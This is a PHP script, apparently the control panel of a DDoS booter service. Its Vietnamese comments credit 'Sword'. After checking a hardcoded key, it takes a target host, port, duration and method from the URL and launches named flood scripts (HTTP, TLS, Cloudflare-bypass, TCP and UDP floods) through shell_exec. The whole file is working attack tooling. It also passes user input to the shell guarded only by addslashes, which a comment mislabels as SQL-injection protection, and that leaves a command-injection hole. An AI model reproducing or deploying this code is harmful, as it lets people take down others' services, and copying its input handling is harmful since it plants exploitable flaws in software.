<?php
// Coded by Sword

// Kiểm tra xem có lỗi khi lấy dữ liệu từ query string không
function checkInput($input) {
    return isset($_GET[$input]) ? $_GET[$input] : null;
}

$key = checkInput('key');
$host = checkInput('host');
$port = checkInput('port');
$time = checkInput('time');
$method = checkInput('method');

// Sử dụng hàm addslashes để tránh SQL injection khi sử dụng biến trong shell_exec
$host = addslashes($host);
$port = addslashes($port);
$time = addslashes($time);
$method = addslashes($method);

if ($key == "trongdz") {
    if ($host == null) { echo "Please enter a host"; }
    elseif ($port == null) { echo "Please enter a port"; }
    elseif ($time == null) { echo "Please enter a time"; }
    elseif ($method == null) { echo "Please enter a method"; }
    else {
        if ($method == "DESTROY-L7") {
            shell_exec("node DESTROY-ALL.js $host $time 50");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "TLS") { 
            shell_exec("node TLSV3.js $host $time 5000 10000 proxy.txt GET");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "HTTP-MIX") { 
            shell_exec("node HTTP-MIX.js $host $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "CF-BROWSER") { 
            shell_exec("node CF-BROWSER.js GET $host proxy.txt $time 64 100");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "DESTROY") { 
            shell_exec("perl destroy.pl $host $port 64 $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "GOD") { 
            shell_exec("perl god.pl $host $port 64 $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "TCP-KILL") { 
            shell_exec("node TCP-KILL.js byte $host:$port $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "UDP-KILL") { 
            shell_exec("perl UDP-KILL.pl $host $port 64 $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
		}
		elseif ($method == "TLS-MMB") { 
            shell_exec("node TLS-MMB.js $host $time 10000 5000");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        else {
            echo "Invalid method!";
        }
    }
}
else { 
    echo "Key invalid !";
}
?>
